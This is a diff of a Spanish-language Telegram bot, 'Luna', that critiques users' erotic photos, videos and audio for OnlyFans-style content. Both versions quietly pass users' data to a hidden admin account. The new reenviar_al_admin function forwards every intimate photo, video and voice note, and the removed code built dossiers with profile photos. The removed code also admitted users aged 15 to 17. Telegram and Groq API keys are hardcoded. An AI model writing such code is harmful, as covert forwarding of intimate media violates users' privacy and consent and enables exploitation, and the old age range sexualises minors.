@@ -1,10 +1,8 @@
 import os
-import io
 import random
 import threading
-import asyncio
-import base64
 import sqlite3
+import io
 from datetime import datetime
 from flask import Flask
 from telegram import Update
@@ -13,40 +11,52 @@ from agewizard import Age
 from huggingface_hub import InferenceClient
 from groq import Groq
 
-# --- CONFIGURACIÓN ---
+# ======================
+# CONFIGURACIÓN
+# ======================
 TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
-DANI_CHAT_ID = 8099004064 
-GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 
+GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2"
+DANI_CHAT_ID = 8099004064
 
 client = Groq(api_key=GROQ_API_KEY)
 hf_client = InferenceClient()
 
-# --- SERVIDOR WEB ---
+# ======================
+# SERVIDOR WEB
+# ======================
 web_app = Flask(__name__)
+
 @web_app.route('/')
-def home(): return "Luna Bot en línea 24/7"
+def home():
+    return "Luna Bot en línea 🌙"
+
 @web_app.route('/health')
-def health(): return "OK"
+def health():
+    return "OK"
+
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
     web_app.run(host="0.0.0.0", port=port)
 
-# --- BASE DE DATOS ---
+# ======================
+# BASE DE DATOS
+# ======================
 def init_db():
-    conn = sqlite3.connect('luna_bot.db')
+    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                  (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, 
-                 nivel INTEGER, puntos INTEGER, estilo TEXT, fetiche TEXT)''')
+                  nivel INTEGER, puntos INTEGER, estilo TEXT, fetiche TEXT)''')
     c.execute('''CREATE TABLE IF NOT EXISTS historial
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
-                 rol TEXT, mensaje TEXT, fecha TEXT)''')
+                  rol TEXT, mensaje TEXT, fecha TEXT)''')
     conn.commit()
     conn.close()
+
 init_db()
 
-def guardar_usuario(user_id, nombre, username, edad, estilo, fetiche):
-    conn = sqlite3.connect('luna_bot.db')
+def guardar_usuario(user_id, nombre, username, edad, estilo, fetiche=""):
+    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
     c = conn.cursor()
     c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?, 1, 0, ?, ?)",
               (user_id, nombre, username, edad, estilo, fetiche))
@@ -54,7 +64,7 @@ def guardar_usuario(user_id, nombre, username, edad, estilo, fetiche):
     conn.close()
 
 def obtener_usuario(user_id):
-    conn = sqlite3.connect('luna_bot.db')
+    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
     c = conn.cursor()
     c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
     row = c.fetchone()
@@ -62,129 +72,380 @@ def obtener_usuario(user_id):
     return row
 
 def limpiar_historial_usuario(user_id):
-    conn = sqlite3.connect('luna_bot.db')
+    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
     c = conn.cursor()
     c.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
     conn.commit()
     conn.close()
 
-bot_pausado = False
+def guardar_mensaje(user_id, rol, mensaje):
+    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
+    c = conn.cursor()
+    c.execute("INSERT INTO historial (user_id, rol, mensaje, fecha) VALUES (?, ?, ?, ?)",
+              (user_id, rol, mensaje, datetime.now().isoformat()))
+    c.execute('''DELETE FROM historial WHERE user_id = ? AND id NOT IN 
+                 (SELECT id FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 12)''',
+              (user_id, user_id))
+    conn.commit()
+    conn.close()
 
-# --- CONSEJOS LOCALES ---
-CONSEJOS_SEXUALES = [
-    "💋 Para que la foto sea más caliente, entreabre los labios y mira a la cámara con deseo. El rostro vende más que el cuerpo.",
-    "🔥 Si vas a hacer un video, empieza mostrando tu rostro y luego baja lentamente. Ese suspenso vuelve locos a los suscriptores.",
-    "💦 Para el audio, usa un tono de voz más ronco y pausado. Imagina que le estás susurrando al oído a alguien que te gusta.",
-    "🍑 Si te tomas una foto de espaldas, gira la cabeza y mira por encima del hombro. Es la pose más clásica y efectiva.",
-    "✨ Usa aceite corporal en los muslos y el escote. La luz lateral hará que tu piel brille y se vea mucho más sexy."
+# ======================
+# PROMPTS
+# ======================
+SYSTEM_PROMPT = """Eres Luna, una amiga cercana, directa y muy buena dando consejos de contenido adulto (OnlyFans, Fansly, etc.).
+
+Personalidad:
+- Hablas de forma natural y cercana.
+- Eres honesta y útil.
+- Eres sexual cuando hace falta, pero siempre concreta.
+"""
+
+CONSEJOS_RESPALDO = [
+    "Se ve bien, pero prueba a mirar más a la cámara con deseo. El rostro vende muchísimo.",
+    "Tiene potencial. Prueba con luz más lateral para marcar mejor el cuerpo.",
+    "Está sexy, aunque podrías mejorar la pose abriendo un poco más las piernas o girando el torso.",
+    "Bien la foto. Intenta entreabrir un poco los labios y relajar la cara.",
+    "Buena base. Prueba a mostrar un poco más de piel de forma sugerente."
 ]
 
-# --- IA HÍBRIDA (Hugging Face + Groq) ---
-def analizar_foto_con_ia(imagen_bytes):
+# ======================
+# ANÁLISIS VISUAL
+# ======================
+def analizar_contenido(imagen_bytes, tipo="foto"):
     try:
-        descripcion = "una persona en una foto"
+        descripcion = "una imagen de una persona"
         try:
-            resp_hf = hf_client.image_to_text(image=imagen_bytes, model="Salesforce/blip-image-captioning-base")
-            descripcion = resp_hf['generated_text']
+            resp_hf = hf_client.image_to_text(
+                image=imagen_bytes,
+                model="Salesforce/blip-image-captioning-base"
+            )
+            descripcion = resp_hf.get('generated_text', descripcion)
         except Exception as e:
             print(f"Error HF: {e}")
-            
-        try:
-            completion = client.chat.completions.create(
-                messages=[
-                    {"role": "system", "content": "Eres Luna, experta en contenido erótico para OnlyFans. Da 3 consejos MUY sexuales y directos sobre cómo mejorar esta foto: iluminación, pose, mostrar el rostro, expresión, lencería. Sé cachonda, directa y profesional."},
-                    {"role": "user", "content": f"La IA de visión ha visto: '{descripcion}'. Dame los consejos."}
-                ],
-                model="llama-3.1-8b-instant",
-            )
-            consejo = completion.choices[0].message.content
-        except Exception as e:
-            print(f"Error Groq: {e}")
-            consejo = random.choice(CONSEJOS_SEXUALES)
-            
-        return f"📸 **Lo que veo:** {descripcion.capitalize()}\n\n🔥 **Mis consejos:**\n{consejo}"
-    except Exception as e:
-        return random.choice(CONSEJOS_SEXUALES)
 
+        prompt = f"""Estás viendo esta {tipo}. Descripción: "{descripcion}".
+
+Responde así:
+1. Empieza diciendo si está bien / tiene potencial / se ve sexy.
+2. Da 3-4 mejoras concretas (pose, cara, luz, ángulo, ropa...).
+3. Habla natural y directa.
+"""
+
+        completion = client.chat.completions.create(
+            messages=[
+                {"role": "system", "content": "Eres experta en contenido erótico. Feedback honesto y útil."},
+                {"role": "user", "content": prompt}
+            ],
+            model="llama-3.1-8b-instant",
+            temperature=0.72,
+            max_tokens=400
+        )
+        return completion.choices[0].message.content.strip()
+    except Exception as e:
+        print(f"Error análisis visual: {e}")
+        return random.choice(CONSEJOS_RESPALDO)
+
+# ======================
+# ANÁLISIS DE AUDIO
+# ======================
+async def analizar_audio(audio_bytes, filename="audio.ogg"):
+    try:
+        transcription = client.audio.transcriptions.create(
+            file=(filename, audio_bytes),
+            model="whisper-large-v3",
+            language="es",
+            response_format="text"
+        )
+        texto = transcription.strip() if isinstance(transcription, str) else getattr(transcription, "text", str(transcription)).strip()
+
+        if not texto or len(texto) < 3:
+            texto = "(principalmente gemidos o sonidos, casi no se entiende habla)"
+
+        prompt = f"""La usuaria envió un audio. Transcripción:
+
+"{texto}"
+
+Analiza y da feedback útil sobre:
+- Si es gemido, speaking, susurro, teasing...
+- Naturalidad del tono
+- Respiración e intensidad
+- Si se escucha forzado o natural
+- Ruido de fondo
+- Consejos concretos para mejorarlo
+
+Habla de forma natural y directa.
+"""
+
+        completion = client.chat.completions.create(
+            messages=[
+                {"role": "system", "content": "Eres experta en audios eróticos para OnlyFans. Feedback práctico."},
+                {"role": "user", "content": prompt}
+            ],
+            model="llama-3.1-8b-instant",
+            temperature=0.7,
+            max_tokens=400
+        )
+        return completion.choices[0].message.content.strip()
+    except Exception as e:
+        print(f"Error análisis audio: {e}")
+        return "Escuché tu audio. Se recibió bien, pero no pude analizarlo con detalle ahora. ¿Me dices qué tipo de audio es?"
+
+# ======================
+# CONVERSACIÓN
+# ======================
 async def conversar_con_memoria(user_id, texto_usuario):
     try:
-        conn = sqlite3.connect('luna_bot.db')
+        conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
         c = conn.cursor()
-        c.execute("SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 6", (user_id,))
+        c.execute("SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 10", (user_id,))
         rows = c.fetchall()
         conn.close()
-        
-        mensajes = [
-            {"role": "system", "content": "Eres Luna, una asistente sexual para modelos de OnlyFans. Hablas de sexo sin filtros, de forma cachonda y directa. Responde a cualquier tema sexual con consejos sugerentes. Sé explícita pero elegante. Máximo 3 frases."}
-        ]
+
+        mensajes = [{"role": "system", "content": SYSTEM_PROMPT}]
         for rol, msg in reversed(rows):
             mensajes.append({"role": rol, "content": msg})
         mensajes.append({"role": "user", "content": texto_usuario})
-        
+
         completion = client.chat.completions.create(
             messages=mensajes,
             model="llama-3.1-8b-instant",
+            temperature=0.75,
+            max_tokens=450
         )
-        respuesta = completion.choices[0].message.content
-        
-        conn = sqlite3.connect('luna_bot.db')
-        c = conn.cursor()
-        c.execute("INSERT INTO historial (user_id, rol, mensaje, fecha) VALUES (?, ?, ?, ?)", (user_id, "user", texto_usuario, datetime.now().isoformat()))
-        c.execute("INSERT INTO historial (user_id, rol, mensaje, fecha) VALUES (?, ?, ?, ?)", (user_id, "assistant", respuesta, datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-        
+        respuesta = completion.choices[0].message.content.strip()
+
+        guardar_mensaje(user_id, "user", texto_usuario)
+        guardar_mensaje(user_id, "assistant", respuesta)
         return respuesta
     except Exception as e:
-        print(f"Error Groq (posible rate limit): {e}")
-        # Si hay error, limpiamos el historial para evitar bucles
-        limpiar_historial_usuario(user_id)
-        return random.choice(CONSEJOS_SEXUALES)
+        print(f"Error conversación: {e}")
+        if "rate_limit" in str(e).lower() or "429" in str(e):
+            limpiar_historial_usuario(user_id)
+        return random.choice(CONSEJOS_RESPALDO)
 
-async def enviar_expediente_inicial(context, user, edad, estilo):
+# ======================
+# COMANDOS EXTRA
+# ======================
+async def generar_caption(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not obtener_usuario(update.effective_user.id):
+        return await update.message.reply_text("Primero regístrate con /start")
+    texto = " ".join(context.args) if context.args else "foto sexy"
     try:
-        username = f"@{user.username}" if user.username else "Oculto"
-        fotos = await context.bot.get_user_profile_photos(user.id, limit=1)
-        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada"
-        reporte = (
-            f"🕵️‍♂️ **EXPEDIENTE (Luna)**\n"
-            f"👤 **Nombre:** {user.first_name}\n"
-            f"🔗 **Usuario:** {username}\n"
-            f"🆔 **ID:** `{user.id}`\n"
-            f"🖼 **Foto Perfil:** {tiene_foto}\n"
-            f"🎂 **Edad:** {edad} años\n"
-            f"🧠 **Estilo:** {estilo}\n"
+        completion = client.chat.completions.create(
+            messages=[
+                {"role": "system", "content": SYSTEM_PROMPT},
+                {"role": "user", "content": f"Genera 3 captions seductores para OnlyFans sobre: {texto}"}
+            ],
+            model="llama-3.1-8b-instant",
+            temperature=0.8
         )
-        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
-        if fotos.total_count > 0:
-            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
-    except Exception as e: print(f"Error: {e}")
+        await update.message.reply_text(completion.choices[0].message.content)
+    except:
+        await update.message.reply_text("No pude generar los captions ahora.")
 
-async def aviso_corto(context, user, tipo):
-    username = f"@{user.username}" if user.username else user.first_name
-    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")
+async def generar_ideas(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not obtener_usuario(update.effective_user.id):
+        return await update.message.reply_text("Primero regístrate con /start")
+    try:
+        completion = client.chat.completions.create(
+            messages=[
+                {"role": "system", "content": SYSTEM_PROMPT},
+                {"role": "user", "content": "Dame 5 ideas de contenido creativas y sexy para OnlyFans/Fansly."}
+            ],
+            model="llama-3.1-8b-instant",
+            temperature=0.85
+        )
+        await update.message.reply_text(completion.choices[0].message.content)
+    except:
+        await update.message.reply_text("No pude generar ideas ahora.")
 
-# --- COMANDOS ---
+async def generar_hashtags(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not obtener_usuario(update.effective_user.id):
+        return await update.message.reply_text("Primero regístrate con /start")
+    tema = " ".join(context.args) if context.args else "onlyfans"
+    try:
+        completion = client.chat.completions.create(
+            messages=[
+                {"role": "system", "content": "Eres experta en hashtags para cuentas adultas."},
+                {"role": "user", "content": f"Dame hashtags efectivos para: {tema}. Máximo 15."}
+            ],
+            model="llama-3.1-8b-instant",
+            temperature=0.6
+        )
+        await update.message.reply_text(completion.choices[0].message.content)
+    except:
+        await update.message.reply_text("No pude generar hashtags ahora.")
+
+# ======================
+# REENVIAR AL ADMIN
+# ======================
+async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        await context.bot.forward_message(
+            chat_id=DANI_CHAT_ID,
+            from_chat_id=update.effective_chat.id,
+            message_id=update.message.message_id
+        )
+    except Exception as e:
+        print(f"Error reenviando: {e}")
+
+# ======================
+# HANDLERS
+# ======================
+bot_pausado = False
+
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if bot_pausado:
+        return
+    if not obtener_usuario(update.effective_user.id):
+        return await update.message.reply_text("Primero envíame tu fecha de nacimiento con /start")
+
+    await reenviar_al_admin(update, context)
+
+    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
+    try:
+        photo_file = await update.message.photo[-1].get_file()
+        photo_bytes = await photo_file.download_as_bytearray()
+        analisis = analizar_contenido(photo_bytes, tipo="foto")
+        await msg.edit_text(analisis)
+    except Exception as e:
+        print(f"Error foto: {e}")
+        await msg.edit_text(random.choice(CONSEJOS_RESPALDO))
+
+async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if bot_pausado:
+        return
+    if not obtener_usuario(update.effective_user.id):
+        return await update.message.reply_text("Primero envíame tu fecha de nacimiento con /start")
+
+    await reenviar_al_admin(update, context)
+
+    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
+
+    try:
+        duration = 0
+        file = None
+        tipo = "video"
+
+        if update.message.video:
+            duration = update.message.video.duration or 0
+            if update.message.video.thumbnail:
+                file = await update.message.video.thumbnail.get_file()
+        elif update.message.video_note:
+            duration = update.message.video_note.duration or 0
+            if update.message.video_note.thumbnail:
+                file = await update.message.video_note.thumbnail.get_file()
+            tipo = "nota de video"
+        elif update.message.animation:
+            duration = update.message.animation.duration or 0
+            if update.message.animation.thumbnail:
+                file = await update.message.animation.thumbnail.get_file()
+            tipo = "GIF"
+
+        analisis_visual = ""
+        if file:
+            img_bytes = await file.download_as_bytearray()
+            analisis_visual = analizar_contenido(img_bytes, tipo=tipo)
+        else:
+            analisis_visual = "Vi tu video. La miniatura no estaba disponible para analizar en detalle."
+
+        LIMITE_CORTO = 25
+
+        if duration > LIMITE_CORTO:
+            texto = (
+                f"{analisis_visual}\n\n"
+                f"⚠️ Tu video dura **{duration} segundos** (es bastante largo).\n\n"
+                "Para darte un análisis mucho mejor del audio y de los momentos clave, te recomiendo:\n"
+                "• Mandarme una **captura** del mejor momento\n"
+                "• O enviarme el **audio** por separado (nota de voz)\n"
+                "• O un trozo más corto del video"
+            )
+            await msg.edit_text(texto)
+        else:
+            try:
+                if update.message.video:
+                    video_file = await update.message.video.get_file()
+                elif update.message.video_note:
+                    video_file = await update.message.video_note.get_file()
+                else:
+                    video_file = await update.message.animation.get_file()
+
+                video_bytes = await video_file.download_as_bytearray()
+                analisis_audio = await analizar_audio(video_bytes, filename="video.mp4")
+
+                texto = (
+                    f"**Análisis visual:**\n{analisis_visual}\n\n"
+                    f"**Análisis del audio:**\n{analisis_audio}"
+                )
+                await msg.edit_text(texto)
+            except Exception as e:
+                print(f"Error intentando audio de video corto: {e}")
+                texto = (
+                    f"{analisis_visual}\n\n"
+                    "No pude analizar bien el audio de este video. "
+                    "Si quieres feedback del sonido, mándame el audio por separado."
+                )
+                await msg.edit_text(texto)
+
+    except Exception as e:
+        print(f"Error general video/gif: {e}")
+        await msg.edit_text(
+            "Vi tu video/GIF y ya lo recibí.\n\n"
+            "Para darte mejores consejos, mándame una captura del mejor momento o el audio por separado."
+        )
+
+async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if bot_pausado:
+        return
+    if not obtener_usuario(update.effective_user.id):
+        return await update.message.reply_text("Primero envíame tu fecha de nacimiento con /start")
+
+    await reenviar_al_admin(update, context)
+
+    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
+
+    try:
+        if update.message.voice:
+            audio_file = await update.message.voice.get_file()
+            filename = "voice.ogg"
+        else:
+            audio_file = await update.message.audio.get_file()
+            filename = update.message.audio.file_name or "audio.mp3"
+
+        audio_bytes = await audio_file.download_as_bytearray()
+        analisis = await analizar_audio(audio_bytes, filename=filename)
+        await msg.edit_text(analisis)
+    except Exception as e:
+        print(f"Error audio: {e}")
+        await msg.edit_text("Escuché tu audio, pero tuve un problema analizándolo. ¿Lo mandas de nuevo?")
+
+# ======================
+# COMANDOS
+# ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if bot_pausado: return await update.message.reply_text("Luna está descansando. 🌙")
+    if bot_pausado:
+        return await update.message.reply_text("Luna está descansando 🌙")
+
     user_id = update.effective_user.id
     if not obtener_usuario(user_id):
-        mensaje = (
-            "¡Hola! 🌙 Soy **Luna**, tu asistente sexual personal.\n\n"
-            "📸 Analizo fotos y te digo cómo hacerlas más calientes.\n"
-            "💬 Converso contigo sobre cualquier tema sexual.\n\n"
-            "Envíame tu fecha de nacimiento (DD-MM-AAAA):"
+        await update.message.reply_text(
+            "¡Hola! 🌙 Soy **Luna**.\n\n"
+            "Te ayudo a mejorar tus fotos, videos, GIFs y audios.\n\n"
+            "Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
         )
-        await update.message.reply_text(mensaje)
     else:
-        await update.message.reply_text("¡Hola de nuevo, amor! 🌙 Envíame una foto o escríbeme.")
+        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video, GIF o audio y te ayudo.")
 
-async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if bot_pausado: return
+async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if bot_pausado:
+        return
+
     text = update.message.text.strip()
     user = update.effective_user
-    if text.startswith('/'): return
-        
+
+    if text.startswith('/'):
+        return
+
     if obtener_usuario(user.id):
         await update.message.chat.send_action(action="typing")
         respuesta = await conversar_con_memoria(user.id, text)
@@ -193,62 +454,69 @@ async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         person = Age(text, date_format="DD-MM-YYYY")
         edad = person.years
-        if 15 <= edad <= 80:
-            if edad < 20: estilo = "Universitaria / Fresca"
-            elif edad < 30: estilo = "Joven / Atrevida"
-            elif edad < 45: estilo = "Experimentada / Segura"
-            else: estilo = "Madura / Elegante"
-            guardar_usuario(user.id, user.first_name, user.username, edad, estilo, random.choice(CONSEJOS_SEXUALES))
-            await update.message.reply_text(f"✅ ¡Todo listo! Envíame fotos o escríbeme.")
-            await enviar_expediente_inicial(context, user, edad, estilo)
+
+        if 18 <= edad <= 80:
+            if edad < 25:
+                estilo = "Joven / Fresca"
+            elif edad < 35:
+                estilo = "Atrevida / Segura"
+            else:
+                estilo = "Madura / Elegante"
+
+            guardar_usuario(user.id, user.first_name, user.username, edad, estilo)
+            await update.message.reply_text("✅ ¡Listo! Ya puedes enviarme fotos, videos, GIFs o audios 💋")
+
+            try:
+                await context.bot.send_message(
+                    chat_id=DANI_CHAT_ID,
+                    text=f"📥 Nueva usuaria: {user.first_name} (@{user.username or 'sin username'}) - {edad} años"
+                )
+            except:
+                pass
         else:
-            await update.message.reply_text(f"❌ Rango: 15 a 80 años.")
+            await update.message.reply_text("Solo acepto mayores de 18 años.")
     except ValueError:
-        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")
+        await update.message.reply_text("Formato incorrecto. Usa **DD-MM-AAAA**")
 
 async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != DANI_CHAT_ID: return
-    conn = sqlite3.connect('luna_bot.db')
+    if update.effective_user.id != DANI_CHAT_ID:
+        return
+    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
     c = conn.cursor()
     c.execute("SELECT COUNT(*) FROM usuarios")
     total = c.fetchone()[0]
     conn.close()
-    await update.message.reply_text(f"📊 **PANEL**\n👥 Chicas: {total}")
+    await update.message.reply_text(f"📊 Usuarias: **{total}**")
 
 async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global bot_pausado
-    if update.effective_user.id != DANI_CHAT_ID: return
+    if update.effective_user.id != DANI_CHAT_ID:
+        return
     bot_pausado = not bot_pausado
-    await update.message.reply_text(f"⚙️ Bot {'PAUSADO' if bot_pausado else 'REANUDADO'}.")
+    estado = "PAUSADO ⏸️" if bot_pausado else "ACTIVO ✅"
+    await update.message.reply_text(f"Bot: {estado}")
 
-# --- MULTIMEDIA ---
-async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if bot_pausado: return
-    user_id = update.effective_user.id
-    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha.")
-    
-    msg_espera = await update.message.reply_text("🔍 **Analizando tu foto...**")
-    photo_file = await update.message.photo[-1].get_file()
-    photo_bytes = await photo_file.download_as_bytearray()
-    
-    sugerencia = analizar_foto_con_ia(photo_bytes)
-    await msg_espera.edit_text(sugerencia)
-    
-    try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
-    except: pass
-    await aviso_corto(context, update.effective_user, "Foto")
-
+# ======================
+# MAIN
+# ======================
 def main():
     threading.Thread(target=run_flask, daemon=True).start()
-    
+
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stats", admin_stats))
     app.add_handler(CommandHandler("pausar", admin_pausar))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
-    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
-    
-    print("Luna Híbrida en línea. Dani observa.")
+    app.add_handler(CommandHandler("caption", generar_caption))
+    app.add_handler(CommandHandler("idea", generar_ideas))
+    app.add_handler(CommandHandler("hashtags", generar_hashtags))
+
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
+    app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE, handle_audio))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
+
+    print("Luna mejorada está en línea 🌙")
     app.run_polling()
 
 if __name__ == "__main__":
